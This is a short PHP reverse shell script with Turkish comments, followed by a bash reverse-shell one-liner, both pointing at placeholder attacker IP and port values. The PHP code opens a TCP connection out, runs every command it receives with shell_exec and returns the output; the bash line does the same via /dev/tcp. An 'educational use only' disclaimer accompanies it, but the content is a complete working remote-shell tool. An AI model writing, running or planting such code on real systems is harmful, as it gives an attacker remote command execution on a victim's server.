<?php
$ip='SALDIRI_HEDEF_IP';
$port=SALDIRI_HEDEF_PORT;
$shell=stream_socket_client("tcp://$ip:$port");
if($shell){
    while(!feof($shell)){
        $cmd=fgets($shell);
        $output=shell_exec($cmd);
        fwrite($shell,$output);
    }
    fclose($shell);
}
# Sisteminizde çalıştırmayınız ve lütfen eğitim amaçlı kullanınız
#Produced by Kamil Umut Araz
?>
    

bash shell komutu
# bash -i >& /dev/tcp/SALDIRI_HEDEF_IP/SALDIRI_HEDEF_PORT 0>&1
